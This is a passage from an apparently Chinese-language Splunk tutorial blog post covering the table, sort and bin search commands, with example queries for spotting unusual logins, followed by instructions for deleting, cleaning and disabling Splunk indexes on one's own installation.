命令.</p><p>要优化搜索，请避免将 <code>table</code> 命令放在搜索的中间，而是将其放在搜索的末尾.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 语法</span></span><br><span class="line">table &lt;wc-field-list&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 参数</span></span><br><span class="line">&lt;wc-field-list&gt;</span><br><span class="line"></span><br><span class="line">- 语法: &lt;wc-field&gt; ...</span><br><span class="line">- 描述: 有效字段名称的列表.该列表可以用空格或逗号分隔.你可以使用星号( * ）作为通配符来指定名称相似的字段列表.</span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例</span></span><br><span class="line"><span class="comment"># 只显示ip,uri,response_time字段</span></span><br><span class="line"><span class="built_in">source</span>=<span class="string">&quot;shop_access.log&quot;</span> | table ip,uri,response_time</span><br></pre></td></tr></table></figure><p>需要注意的是</p><ol><li>要生成可视化图表，搜索结果必须包含数值、日期时间或聚合数据，如计数、求和或平均值.</li><li>table 命令不允许你重命名字段，只能指定你希望在表格结果中显示的字段.如果你打算重命名字段，请在将结果传递给 table 命令之前进行.</li><li>table 命令根据 <code>limits.conf</code> 文件中的设置截断返回的结果数量.在<code>search</code>节中，如果<code>truncate_report</code>参数的值为 1，则返回的结果数量会被截断.结果数量由<code>search</code>节中的<code>max_count</code>参数控制.如果<code>truncate_report</code>设置为 0，则不应用<code>max_count</code>参数.</li></ol><h4 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h4><p><code>sort</code> 命令按指定字段对所有结果进行排序.如果顺序分别为降序或升序，则缺少给定字段的结果将被视为具有该字段的最小或最大可能值.</p><p>如果 <code>sort</code> 命令的第一个参数是一个数字，那么最多按顺序返回这么多结果.如果未指定数字，则使用默认限制10000.如果指定数字0，则返回所有结果.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 语法</span></span><br><span class="line"><span class="built_in">sort</span></span><br><span class="line">[&lt;count&gt;]</span><br><span class="line">&lt;sort-by-clause&gt;... </span><br><span class="line">[desc]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 必须参数</span></span><br><span class="line">&lt;sort-by-clause&gt;</span><br><span class="line">语法: [ - | + ] &lt;sort-field&gt;, ( - | + ) &lt;sort-field&gt; ...</span><br><span class="line">描述: 要排序的字段列表及排序顺序.使用减号 (-) 表示降序，使用加号 (+) 表示升序.当指定多个字段时，用逗号分隔字段名称.参见排序字段选项.</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可选参数</span></span><br><span class="line">&lt;count&gt;</span><br><span class="line">语法: &lt;int&gt; | <span class="built_in">limit</span>=&lt;int&gt;</span><br><span class="line">描述: 指定从排序结果中返回的结果数量.如果未指定数量，则使用默认限制 10000.如果指定为 0，则返回所有结果.可以使用整数指定数量，或者在数量前面加上标签，例如 <span class="built_in">limit</span>=10.</span><br><span class="line"></span><br><span class="line">desc</span><br><span class="line">语法: d | desc</span><br><span class="line">描述: 反转结果的顺序.如果指定了多个字段，将按指定字段的顺序反转字段值的顺序.例如，如果指定了三个字段，desc 参数将反转第一个字段的值顺序.对于第一个字段中每组重复的值，反转第二个字段的对应值顺序.对于第二个字段中每组重复的值，反转第三个字段的对应值顺序.</span><br><span class="line"></span><br><span class="line"><span class="comment"># 排序字段选项</span></span><br><span class="line">&lt;sort-field&gt;</span><br><span class="line">语法: &lt;field&gt; | auto(&lt;field&gt;) | str(&lt;field&gt;) | ip(&lt;field&gt;) | num(&lt;field&gt;)</span><br><span class="line">描述: 可以与 &lt;sort-field&gt; 一起指定的选项.</span><br><span class="line"></span><br><span class="line">&lt;field&gt;</span><br><span class="line">语法: &lt;string&gt;</span><br><span class="line">描述: 要排序的字段名称.</span><br><span class="line"></span><br><span class="line">auto</span><br><span class="line">语法: auto(&lt;field&gt;)</span><br><span class="line">描述: 自动确定字段值的排序方式.</span><br><span class="line"></span><br><span class="line">ip</span><br><span class="line">语法: ip(&lt;field&gt;)</span><br><span class="line">描述: 将字段值转换为 IP 地址.</span><br><span class="line"></span><br><span class="line">num</span><br><span class="line">语法: num(&lt;field&gt;)</span><br><span class="line">描述: 将字段值转换为数字.</span><br><span class="line"></span><br><span class="line">str</span><br><span class="line">语法: str(&lt;field&gt;)</span><br><span class="line">描述: 将字段值转换为字符串，并按字母顺序排序.</span><br></pre></td></tr></table></figure><h5 id="示例-7"><a href="#示例-7" class="headerlink" title="示例"></a>示例</h5><ol><li><p>按 <code>ip</code>字段以升序对结果进行排序，然后按<code>url</code>字段以降序进行排序</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span>=<span class="string">&quot;shop_access.log&quot;</span> | <span class="built_in">sort</span> ip(ip),-str(uri)</span><br></pre></td></tr></table></figure></li><li><p>按<code>length</code>字段的降序对前100个结果排序，然后按<code>uri</code>值的升序排序</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span>=<span class="string">&quot;shop_access.log&quot;</span> | <span class="built_in">sort</span> -num(length),+str(uri)</span><br></pre></td></tr></table></figure></li><li><p>按<code>_time</code>字段升序对结果排序，然后按<code>ip</code>值降序对结果排序.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span>=<span class="string">&quot;shop_access.log&quot;</span> | <span class="built_in">sort</span> _time, -host</span><br></pre></td></tr></table></figure></li><li><p>返回最近的事件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span>=<span class="string">&quot;shop_access.log&quot;</span> | <span class="built_in">sort</span> 1 -_time</span><br></pre></td></tr></table></figure></li></ol><h4 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h4><p>通过调整·<code>&lt;field&gt; </code>的值，将连续的数值放入离散的集合或区间(bins），使特定集合中的所有项目具有相同的值.</p><blockquote><p>“箱数”: 指的是数据被分割成的不同组或类别的数量.在数据分析中，当我们说”箱数”时，我们通常是指将连续的数据值分成若干个区间或”箱子”，每个”箱子”包含一组特定的数据点.这样做可以帮助我们更直观地理解数据的分布情况.例如，如果你有一组学生的考试成绩，你可以将这些成绩分成几个”箱子”，比如60分以下、60-70分、70-80分等等，这样每个”箱子”就代表了一个分数段.</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 语法</span></span><br><span class="line">bin [&lt;bin-options&gt;...] &lt;field&gt; [AS &lt;newfield&gt;]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 必须参数</span></span><br><span class="line">field</span><br><span class="line">语法: &lt;field&gt;</span><br><span class="line">描述: 指定字段名称.</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可选参数</span></span><br><span class="line">bin-options</span><br><span class="line">语法: bins | minspan | span | &lt;start-end&gt; | aligntime</span><br><span class="line">描述: 离散化选项</span><br><span class="line"></span><br><span class="line">newfield</span><br><span class="line">语法: &lt;string&gt;</span><br><span class="line">描述: 字段的新名称.</span><br></pre></td></tr></table></figure><h5 id="Bins-options"><a href="#Bins-options" class="headerlink" title="Bins-options"></a>Bins-options</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># bins</span></span><br><span class="line">语法: bins=&lt;int&gt;</span><br><span class="line">描述: 设置离散化为的最大箱数.默认值在 limits.conf 文件中的 [discretize] 节中设置.</span><br><span class="line">默认值: 100</span><br><span class="line"></span><br><span class="line"><span class="comment"># minspan</span></span><br><span class="line">语法: minspan=&lt;span-length&gt;</span><br><span class="line">描述: 指定用于自动推断跨度的数据时间范围的最小跨度.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># span</span></span><br><span class="line">语法: span = &lt;log-span&gt; | &lt;span-length&gt;</span><br><span class="line">描述: 设置每个箱的大小，使用基于对数的跨度或基于时间的跨度.使用一天或更长时间的 span-length 时，跨度对齐到用户时区的午夜.</span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;start-end&gt;</span></span><br><span class="line">语法: start=&lt;num&gt; | end=&lt;num&gt;</span><br><span class="line">描述: 设置数值箱的最小和最大范围.分析字段中的数据并确定起始值和结束值.当未指定跨度值时，使用 start 和 end 参数.只能使用 start 或 end 参数扩展范围，而不能缩短范围.例如，如果字段表示秒且值范围为 0-59.如果指定跨度为 10，则按 10 的增量计算箱.箱的范围为 0-9, 10-19, 20-29，以此类推.如果未指定跨度，但指定 end=1000，则根据实际起始值和结束值 1000 计算箱.如果设置 end=10 且值 &gt;10，则 end 参数无效.</span><br><span class="line"></span><br><span class="line"><span class="comment"># aligntime</span></span><br><span class="line">语法: aligntime=(earliest | latest | &lt;time-specifier&gt;)</span><br><span class="line">描述: 将箱时间对齐到基础 UTC 时间(epoch 0）以外的时间.aligntime 选项仅在进行基于时间的离散化时有效.如果跨度为天、月或年，则忽略.</span><br></pre></td></tr></table></figure><h5 id="Span-选项"><a href="#Span-选项" class="headerlink" title="Span 选项"></a>Span 选项</h5><blockquote><p>“对数基跨度”是一种用于将数据分箱的特殊方式，基于对数比例来确定每个箱子的范围.它并不是按照线性等间距来分箱，而是按照某个对数规则来分箱.</p><p>具体来说:</p><ul><li><strong>系数</strong>:这是对数跨度的第一个数字，表示每个箱子的宽度相对于前一个箱子的增长因子.</li><li><strong>基数</strong>:这是对数跨度的第二个数字，表示对数的底数.</li></ul><p>例如，如果你设置跨度为 <code>2log10</code>，这意味着你使用以10为底的对数，并且每个箱子的范围是前一个箱子的2倍.</p><p>通俗地解释，对数基跨度就是根据对数的增长规律来划分数据，比如:</p><ul><li>第一个箱子可能是1-10，</li><li>第二个箱子是10-100，</li><li>第三个箱子是100-1000，<br>依此类推.每个箱子的范围按对数增长，而不是等间距增长.这样做有助于处理数据范围非常广泛的情况，使得每个箱子能更好地代表不同数量级的数据.</li></ul></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># log-span</span></span><br><span class="line">语法: [&lt;num&gt;]<span class="built_in">log</span>[&lt;num&gt;]</span><br><span class="line">描述: 设置对数基跨度.第一个数字是系数.第二个数字是基数.如果提供第一个数字，则必须是 &gt;= 1.0 且 &lt; 基数的实数.基数(如果提供）必须是 &gt; 1.0 的实数.</span><br><span class="line"></span><br><span class="line">示例: span=2log10</span><br><span class="line"></span><br><span class="line">span-length</span><br><span class="line">语法: &lt;int&gt;[&lt;timescale&gt;]</span><br><span class="line">描述: 每个箱的跨度.如果基于 _time 字段进行离散化或与时间尺度一起使用，则视为时间范围.否则，这就是一个绝对的箱长度.</span><br></pre></td></tr></table></figure><h5 id="时间尺度"><a href="#时间尺度" class="headerlink" title="时间尺度"></a>时间尺度</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;timescale&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 语法:</span></span><br><span class="line">&lt;sec&gt; | &lt;min&gt; | &lt;hr&gt; | &lt;day&gt; | &lt;month&gt; | &lt;subseconds&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 描述: 时间尺度单位.如果基于 _time 字段进行离散化.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 默认值: sec</span></span><br></pre></td></tr></table></figure><table><thead><tr><th>时间尺度</th><th>语法</th><th>描述</th></tr></thead><tbody><tr><td>&lt;sec&gt;</td><td>s | sec | secs | second | seconds</td><td>秒为单位的时间尺度.</td></tr><tr><td>&lt;min&gt;</td><td>m | min | mins | minute | minutes</td><td>分钟为单位的时间尺度.</td></tr><tr><td>&lt;hr&gt;</td><td>h | hr | hrs | hour | hours</td><td>小时为单位的时间尺度.</td></tr><tr><td>&lt;day&gt;</td><td>d | day | days</td><td>天为单位的时间尺度.</td></tr><tr><td>&lt;month&gt;</td><td>mon | month | months</td><td>月为单位的时间尺度.</td></tr><tr><td>&lt;subseconds&gt;</td><td>us | ms | cs | ds</td><td>微秒 (us)、毫秒 (ms)、厘秒 (cs) 或十分之一秒 (ds) 为单位的时间尺度.</td></tr></tbody></table><h5 id="示例-8"><a href="#示例-8" class="headerlink" title="示例"></a>示例</h5><ol><li><p>1天内超过3个城市登录即可视为异地登录异常.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span>=<span class="string">&quot;secure&quot;</span> action=<span class="string">&quot;Filed password&quot;</span> | bin  _time  span=1d |iplocation  ip  | stats  values(ip) as ip  values(City) as City  dc(City) as src_count by  user|search src_count&gt;3</span><br></pre></td></tr></table></figure></li><li><p>1天内同一个ip登录超过10个账号</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span>=<span class="string">&quot;secure&quot;</span> action=<span class="string">&quot;Accepted&quot;</span> |  bin  _time  span=1d | stats count(user) by ip|  rename count(user) as User_count | search User_count&gt;10</span><br></pre></td></tr></table></figure></li><li><p>凌晨0点到早上8点内，登录成功的账号.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span>=<span class="string">&quot;secure&quot;</span> action=<span class="string">&quot;Accepted&quot;</span>  date_hour&lt;8 | table _time,ip,user</span><br></pre></td></tr></table></figure></li></ol><h2 id="删除索引数据"><a href="#删除索引数据" class="headerlink" title="删除索引数据"></a>删除索引数据</h2><p>当您添加数据时,索引器将处理数据并将其存储在索引中.默认情况下,提供给索引器的数据存储在主索引中,可以为不同的数据输入创建和指定其他索引.</p><p>索引是目录和文件的集合.它们位于 <code>$SPLUNK_HOME/var/lib/splunk</code> 下.索引目录也称为存储桶,按时间组织.</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181106955.png" data-fancybox="true"/></div></div><p>除了主索引之外,Splunk Enterprise还预配置了许多内部索引.内部索引开始以下划线_开头;例如<code>_audit</code>和<code>_internal</code>.<br>要查看内部索引的完整列表,请转到Splunk Web,选择导航–&gt;设置—&gt;索引.</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181106900.png" data-fancybox="true"/></div></div><h3 id="删除索引和索引数据"><a href="#删除索引和索引数据" class="headerlink" title="删除索引和索引数据"></a>删除索引和索引数据</h3><p>从索引器中删除索引数据甚至整个索引.这些是主要的选择:</p><ul><li>从后续搜索中删除事件.</li><li>从一个或多个索引中删除所有数据.</li><li>删除或禁用整个索引.</li></ul><div class="tag-plugin colorful note" color="error"><div class="title">注意!!!</div><div class="body"><p>删除数据是不可逆的.如果希望在使用本教程中介绍的任何技术删除数据后恢复数据,则必须对适用的数据源重新编制索引.</p></div></div><h3 id="从后续搜索中删除事件"><a href="#从后续搜索中删除事件" class="headerlink" title="从后续搜索中删除事件"></a>从后续搜索中删除事件</h3><p>Splunk 的搜索语言提供了 <code>delete</code> 命令,用来从后续的搜索结果中删除事件数据.这个命令只能用于事件索引,不能用于度量索引.</p><p>需要注意的是,你不能在实时搜索中使用 <code>delete</code> 命令.如果你在实时搜索中尝试使用这个命令,Splunk Enterprise 会显示错误.</p><blockquote><p>度量索引(Metrics Index)是Splunk中的一种特殊类型的索引,专门用于存储和处理时间序列数据,例如性能指标、统计数据或其他度量数据.与传统的事件索引不同,度量索引针对高效存储和快速检索设计,特别适合处理大量、频繁更新的数据.</p></blockquote> <div class="tag-plugin colorful note" color="error"><div class="title">注意!!!</div><div class="body"><p><code>delete</code> 命令仅从后续搜索中删除事件.数据本身仍保留在索引中.</p></div></div><p><code>delete</code> 命令只能由具有<code>delete_by_keyword</code>功能的用户运行.默认情况下,Splunk Enterprise附带了一个特殊的角色<code>can_delete</code>,它具有此功能(没有其他功能).默认情况下,管理员角色没有此功能.建议您创建一个特殊用户,以便在删除索引数据时登录到该用户.</p><p>首先运行一个搜索,返回您要删除的事件.请确保此搜索仅返回要删除的事件,而不返回其他事件.一旦确定了这一点,就可以将搜索结果传递给 <code>delete</code> 命令.</p><p>例如,如果要从名为 <code>shop_access.log</code> 的源中删除已编入索引的事件,使其不再出现在搜索中,请执行以下操作:</p><ol><li>禁用或删除该源,使其不再被索引.</li><li>在索引中搜索来自该源的事件:<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span>=<span class="string">&quot;shop_access.log&quot;</span></span><br></pre></td></tr></table></figure></li><li>查看结果以确认这是您要删除的数据.</li><li>确认这是您要删除的数据后,将搜索路径设置为 <code>delete</code> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span>=<span class="string">&quot;shop_access.log&quot;</span> | delete</span><br></pre></td></tr></table></figure>将搜索连接到 <code>delete</code> 命令会标记该搜索返回的所有事件,以便后续搜索不会返回这些事件.任何用户(即使具有管理员权限)在搜索时都无法看到此数据.<div class="tag-plugin colorful note" color="error"><div class="title">注意!!!</div><div class="body"><p>连接到 <code>delete</code> 不会回收磁盘空间.数据实际上并没有从索引中删除;它只是对搜索不可见.</p></div></div><code>delete</code> 命令不会更新事件的元数据,因此任何元数据搜索仍将包括事件,尽管它们不可搜索.主“所有索引数据”仪表板仍将显示已删除源、主机或源类型的事件计数.</li></ol><h3 id="从一个或所有索引中删除所有数据"><a href="#从一个或所有索引中删除所有数据" class="headerlink" title="从一个或所有索引中删除所有数据"></a>从一个或所有索引中删除所有数据</h3><p>要从磁盘中永久删除索引数据,请使用CLI <code>clean</code> 命令.<br>此命令完全删除一个或所有索引中的数据,具体取决于您是否提供了 <code>&lt;index_name&gt;</code> 参数.<br>通常,在重新索引所有数据之前运行 <code>clean</code> .<br>注意: <code>clean</code> 命令不适用于聚集索引.<br>以下是使用 <code>clean</code> 命令的主要方法:</p><ol><li><p>要访问 <code>clean</code> 的帮助页面,请键入以下内容:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">D:\Software\Splunk\bin&gt;splunk.exe <span class="built_in">help</span> clean</span><br><span class="line">警告:服务器证书主机名验证已禁用.请参阅 server.conf/[sslConfig]/cliVerifyServerName 了解详情.</span><br><span class="line">    clean 命令用于删除 Splunk 安装中的事件数据、全局数据和用户账户数据.</span><br><span class="line">    永久删除索引中的事件数据,请输入 <span class="string">&quot;./splunk clean eventdata&quot;</span>.设置 index 参数以删除特定索引中的事件数据.如果不设置索引,Splunk 将删除所有索引中的所有事件数据.</span><br><span class="line">    通过输入 <span class="string">&quot;./splunk clean globaldata&quot;</span> 删除 Splunk 中的全局数据(你索引的事件的标签和源类型别名).</span><br><span class="line">    通过输入 <span class="string">&quot;./splunk clean userdata&quot;</span> 删除 Splunk 中的用户数据(你创建的用户账户).</span><br><span class="line">    ** 注意: **</span><br><span class="line">    删除数据是不可逆的.在选择要从 Splunk 安装中删除的数据时请谨慎.如果需要恢复数据,必须重新索引适用的数据源.</span><br><span class="line">    ** 提示: **</span><br><span class="line">    添加 -f 参数以强制 clean 跳过其确认提示.</span><br><span class="line"></span><br><span class="line">    语法:</span><br><span class="line">        clean  eventdata [-f] [-index &lt;名称&gt;] [--remote=&lt;布尔值&gt;]</span><br><span class="line">        clean  (globaldata|userdata|locks|all|deployment-artifacts) [-f]</span><br><span class="line">        clean  all [--remote=&lt;布尔值&gt;]</span><br><span class="line">        clean  inputdata [&lt;方案&gt;]</span><br><span class="line">        clean  kvstore [-f] (-<span class="built_in">local</span>|-all|-app &lt;应用名称&gt;|-app &lt;应用名称&gt; -collection &lt;集合名称&gt;|-cluster)</span><br><span class="line">        clean  raft [-f]</span><br><span class="line">    对象:</span><br><span class="line">          eventdata    导出的作为原始日志文件索引的事件</span><br><span class="line">          globaldata   主机标签,源类型别名</span><br><span class="line">          userdata     用户账户</span><br><span class="line">          inputdata    模块化输入检查点数据</span><br><span class="line">          locks        内部锁文件(仅在 Splunk 支持建议时)</span><br><span class="line">          kvstore      应用程序键/值存储数据库</span><br><span class="line">          raft         搜索头集群 raft 配置</span><br><span class="line">          all          上述所有内容；*不包括* deployment-artifacts</span><br><span class="line">          deployment-artifacts    由实例创建的文件,该实例曾作为部署服务器或部署客户端</span><br><span class="line">                                  (仅在 Splunk 支持建议时)</span><br><span class="line">    必需参数:</span><br><span class="line">         eventdata    如果没有指定索引,默认是清理所有索引</span><br><span class="line">         inputdata    如果没有指定模块化输入方案,默认是清理所有注册的模块化输入的数据</span><br><span class="line">         kvstore      没有默认模式,必须给定有效模式</span><br><span class="line">    可选参数:</span><br><span class="line">         eventdata    index        应清理事件数据的索引名称</span><br><span class="line">                       f            强制 clean 跳过其确认提示</span><br><span class="line">                                    (清理无法撤销.请谨慎使用！)</span><br><span class="line">                       --remote=    &lt;<span class="literal">true</span>/ <span class="literal">false</span>&gt; 覆盖默认配置并清理/跳过远程索引</span><br><span class="line">         globaldata   f            强制 clean 跳过其确认提示</span><br><span class="line">                                    (清理无法撤销.请谨慎使用！)</span><br><span class="line">         userdata     f            强制 clean 跳过其确认提示</span><br><span class="line">                                    (清理无法撤销.请谨慎使用！)</span><br><span class="line">         kvstore      <span class="built_in">local</span>        删除本地键值存储数据库</span><br><span class="line">                       all          从所有应用集合中删除数据</span><br><span class="line">                       app          从特定应用集合中删除数据</span><br><span class="line">                       collection   从特定集合中删除数据</span><br><span class="line">                                    (只能与 app 参数一起使用)</span><br><span class="line">                       cluster      删除当前 kvstore 集群配置</span><br><span class="line">                                    (当你想将当前实例移出 SHC/SHP 并保留数据时使用)</span><br><span class="line">                       f            强制 clean 跳过其确认提示</span><br><span class="line">                                    (清理无法撤销.请谨慎使用！)</span><br><span class="line">         raft         f            强制 clean 跳过其确认提示</span><br><span class="line">                                    (清理无法撤销.请谨慎使用！)</span><br><span class="line">         all          --remote=    &lt;<span class="literal">true</span>/ <span class="literal">false</span>&gt; 覆盖默认配置并清理/跳过远程索引</span><br><span class="line">    示例:</span><br><span class="line">          ./splunk clean eventdata</span><br><span class="line">          ./splunk clean globaldata</span><br><span class="line">          ./splunk clean eventdata -index main -f</span><br><span class="line">          ./splunk clean eventdata --remote=<span class="literal">true</span></span><br><span class="line">          ./splunk clean inputdata s3</span><br><span class="line"></span><br><span class="line">    输入 <span class="string">&quot;help [对象|主题]&quot;</span> 查看特定对象或主题的帮助.</span><br><span class="line">    完整的文档可在以下网址在线获取:http://docs.splunk.com/Documentation</span><br></pre></td></tr></table></figure></li><li><p>关闭<code>splunk</code></p></li><li><p><code>splunk.exe clean eventdata -index main -f</code></p></li><li><p>启动<code>splunk</code></p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181106851.png" data-fancybox="true"/></div></div></li></ol><h3 id="完全删除索引"><a href="#完全删除索引" class="headerlink" title="完全删除索引"></a>完全删除索引</h3><p>要从非集群索引器中完全删除索引(而不仅仅是其中包含的数据),使用Splunk Web或CLI.也可以直接编辑 <code>indexes.conf</code></p><p>在删除索引之前,请查看索引器上的所有 <code>inputs.conf</code> 文件以及向索引器发送数据的任何转发器,并确保没有任何节将数据定向到您计划删除的索引.例如,如果你想删除一个名为<code>nogood</code>的索引,请确保以下属性&#x2F;值对不会出现在你的任何输入节中: <code>index=nogood</code> .一旦索引被删除,索引器将丢弃仍发送到该索引的任何数据.</p><p>要在Splunk Web中删除索引,请导航到设置&gt;索引,然后单击要删除的索引右侧的删除.此操作将删除索引的数据目录,并从 <code>indexes.conf</code> 中删除索引的节.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 通过CLI删除索引</span></span><br><span class="line">splunk remove index &lt;index_name&gt;</span><br></pre></td></tr></table></figure><p>此命令删除索引的数据目录,并从 <code>indexes.conf</code> 中删除索引的节.<br>在索引器运行时运行 <code>splunk remove index</code> .命令完成后,无需重新启动索引器.也可以通过直接编辑 <code>indexes.conf</code> 并删除索引的节来删除索引.重新启动索引器,然后删除索引的目录<br>要从索引器集群中删除索引,必须编辑 <code>indexes.conf</code> 并删除索引的节.您不能使用Splunk Web或CLI.与索引器群集上的所有此类更改一样,首先在管理器节点上编辑文件,然后将更改应用于对等节点.请参阅在索引器集群中配置对等索引应用了 <code>indexes.conf</code> 更改并且对等节点重新启动后,请从每个对等节点中删除索引的目录.</p><h3 id="禁用索引而不将其删除"><a href="#禁用索引而不将其删除" class="headerlink" title="禁用索引而不将其删除"></a>禁用索引而不将其删除</h3><p>索引一旦被禁用,索引器就不再接受针对它的数据.但是,禁用索引不会删除索引数据,并且该操作是可逆的.</p><p>在Splunk Web中禁用索引.要执行此操作,请导航到设置&gt;索引,然后单击要禁用的索引右侧的禁用.要重新启用索引,请单击索引右侧的启用.</p><p>也可以使用CLI命令:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 禁用索引</span></span><br><span class="line">splunk <span class="built_in">disable</span> index &lt;index_name&gt;</span><br><span class="line"><span class="comment"># 重新启用索引</span></span><br><span class="line">splunk <span class="built_in">enable</span> index &lt;index_name&gt;</span><br></pre></td></tr></table></figure><p>要禁用索引器集群的索引,必须在索引节中编辑 <code>indexes.conf</code> 并设置 <code>disabled=true</code> .您不能使用Splunk Web或CLI.与索引器群集上的所有此类更改一样,首先在管理器节点上编辑文件,然后将更改应用于对等节点.</p>]]></content>
    
    
      
      
